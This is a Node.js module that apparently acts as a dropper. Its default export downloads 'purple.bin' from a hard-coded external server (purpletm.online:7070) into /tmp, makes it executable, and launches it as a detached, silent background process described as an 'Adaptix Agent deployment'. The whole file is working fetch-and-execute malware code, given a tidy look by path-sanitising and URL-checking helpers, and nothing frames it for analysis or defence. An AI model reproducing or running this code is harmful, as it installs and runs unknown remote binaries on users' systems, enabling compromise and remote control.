const { spawn } = require("child_process");
const fs = require("fs");
const path = require("path");
const https = require("https");
const http = require("http");

function sanitizePath(inputPath) {
    return path.normalize(inputPath).replace(/[^a-zA-Z0-9._\/-]/g, '_');
}

function validateUrl(url) {
    try {
        const parsed = new URL(url);
        return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
        return false;
    }
}

function downloadFile(url, outputPath) {
    return new Promise((resolve, reject) => {
        if (!validateUrl(url)) {
            reject(new Error("Invalid URL"));
            return;
        }

        const parsedUrl = new URL(url);
        const client = parsedUrl.protocol === 'https:' ? https : http;

        console.log(`📥 Downloading from: ${url}`);
        console.log(`💾 Saving to: ${outputPath}`);

        const request = client.get(url, (response) => {
            if (response.statusCode !== 200) {
                reject(new Error(`Download failed: ${response.statusCode}`));
                return;
            }

            const fileStream = fs.createWriteStream(outputPath, { mode: 0o755 });
            let downloadedBytes = 0;

            response.on('data', (chunk) => {
                downloadedBytes += chunk.length;
                fileStream.write(chunk);
            });

            response.on('end', () => {
                fileStream.end();
                console.log(`✅ Download completed: ${downloadedBytes} bytes`);
                resolve(outputPath);
            });

            response.on('error', (error) => {
                fileStream.destroy();
                reject(error);
            });
        });

        request.on('error', (error) => {
            reject(error);
        });

        request.setTimeout(60000, () => {
            request.destroy();
            reject(new Error("Download timeout"));
        });
    });
}

function executeFile(filePath) {
    if (!fs.existsSync(filePath)) {
        throw new Error("File not found");
    }

    console.log(`🚀 Executing: ${filePath}`);

    try {
        fs.chmodSync(filePath, 0o755);
    } catch (error) {
        console.log(`⚠️ Chmod failed: ${error.message}`);
    }

    const child = spawn('/bin/sh', ['-c', `${filePath} &`], {
        detached: true,
        stdio: 'ignore'
    });

    child.unref();

    console.log(`✅ Process started with PID: ${child.pid}`);
    
    return {
        success: true,
        pid: child.pid,
        detached: true
    };
}

module.exports = async function(options = {}) {
    const downloadUrl = options.url || "http://purpletm.online:7070/purple.bin";
    const targetDir = options.dir || "/tmp";
    const filename = options.filename || "purple.bin";
    
    const sanitizedDir = sanitizePath(targetDir);
    const sanitizedFilename = sanitizePath(filename);
    const fullPath = path.join(sanitizedDir, sanitizedFilename);

    console.log("🔧 Starting Adaptix Agent deployment...");

    try {
        if (!fs.existsSync(sanitizedDir)) {
            fs.mkdirSync(sanitizedDir, { recursive: true, mode: 0o755 });
        }

        await downloadFile(downloadUrl, fullPath);

        const execResult = executeFile(fullPath);

        console.log(`📁 Binary persisted at: ${fullPath}`);

        return {
            success: execResult.success,
            filePath: fullPath,
            pid: execResult.pid
        };

    } catch (error) {
        console.error(`❌ Deployment failed`);
        throw error;
    }
};